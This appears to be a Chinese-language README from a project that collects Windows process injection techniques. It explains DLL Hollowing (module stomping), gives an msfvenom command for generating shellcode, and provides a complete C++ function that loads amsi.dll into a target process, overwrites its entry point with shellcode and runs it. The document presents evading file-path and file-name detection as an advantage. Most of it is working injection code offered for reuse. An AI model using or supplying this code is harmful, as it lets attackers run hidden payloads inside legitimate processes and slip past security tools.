## Windows下的进程注入方法

### 0x00 前言

​		本项目致力于尽可能多的收集Windows下的进程注入方法，并提供源码复现。

### 0x01 工作计划

- [x] DLL Hollowing

### 0x02 注入内容

​		为了验证注入方法的可行性，我们使用`msfvenmon`工具生成执行命令行的shellcode：

```
msfvenom -p windows/x64/exec CMD=cmd.exe -f c > shellcode.h
```

### 0x03 DLL Hollowing

​		Module Stomping（又称为Module Overloading或DLL Hollowing）技术，基本原理是将一些正常的DLL注入到目标进程中，寻找入口函数，并使用ShellCode覆盖入口地址所指向的内容，创建新线程加以执行。

#### 基本步骤

- 向远程进程中导入良性Windows DLL，例如`C:\\windows\\system32\\amsi.dll`
- 使用ShellCode覆写良性DLL的入口地址内容。
- 启动线程执行DLL 入口地址。

#### 优势

- 无需显式分配或者修改`RWX`执行权限内存页。
- ShellCode被注入到完全合法的Windows DLL中，因此基于文件路径或文件名的检测失效。
- 执行ShellCode的远程线程由合法的Windows模块相关联。

#### 源码实现

```
int DLLHollowing()
{
	HANDLE processHandle;
	PVOID remoteBuffer;
	WCHAR moduleToInject[] = L"C:\\windows\\system32\\amsi.dll";
	HMODULE modules[256] = {};
	SIZE_T modulesSize = sizeof(modules);
	DWORD modulesSizeNeeded = 0;
	DWORD moduleNameSize = 0;
	SIZE_T modulesCount = 0;
	CHAR remoteModuleName[128] = {};
	HMODULE remoteModule = NULL;

	// inject a benign DLL into remote process
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetPID(ProcessName));

	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof moduleToInject, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, sizeof moduleToInject, NULL);
	PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	HandlePtr dllThreadHandlePtr(
		CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL),
		&::CloseHandle);

	HANDLE dllThreadHandle = dllThreadHandlePtr.get();
	if (!dllThreadHandle)
	{
		throw MyException("CreateRemoteThread failed.");
		return -1;
	}
	WaitForSingleObject(dllThreadHandle, 1000);

	// find base address of the injected benign DLL in remote process
	EnumProcessModules(processHandle, modules, modulesSize, &modulesSizeNeeded);
	modulesCount = modulesSizeNeeded / sizeof(HMODULE);
	for (size_t i = 0; i < modulesCount; i++)
	{
		remoteModule = modules[i];
		GetModuleBaseNameA(processHandle, remoteModule, remoteModuleName, sizeof(remoteModuleName));
		if (std::string(remoteModuleName).compare("amsi.dll") == 0)
		{
			std::cout << remoteModuleName << " at " << modules[i];
			break;
		}
	}

	// get DLL's AddressOfEntryPoint
	DWORD headerBufferSize = 0x1000;
	LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);
	ReadProcessMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew);
	LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule);
	std::cout << ", entryPoint at " << dllEntryPoint;

	// write shellcode to DLL's AddressofEntryPoint
	WriteProcessMemory(processHandle, dllEntryPoint, (LPCVOID)shellcode, sizeof(shellcode), NULL);

	// execute shellcode from inside the benign DLL
	CreateRemoteThread(processHandle, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);

	return 0;
}
```

